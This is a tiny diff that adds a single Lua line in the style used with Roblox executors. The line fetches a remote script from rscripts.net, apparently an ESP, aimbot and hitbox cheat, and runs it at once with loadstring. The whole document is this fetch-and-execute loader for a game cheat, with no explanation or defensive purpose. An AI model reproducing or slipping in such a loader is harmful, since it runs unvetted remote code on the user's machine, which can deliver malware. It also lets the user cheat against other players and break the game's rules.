@@ -1,0 +1,2 @@
+
+loadstring(game:HttpGet("https://rscripts.net/raw/esp-aimbot-hitbox_1787457312627_wJ7oQKJFS9.txt",true))()
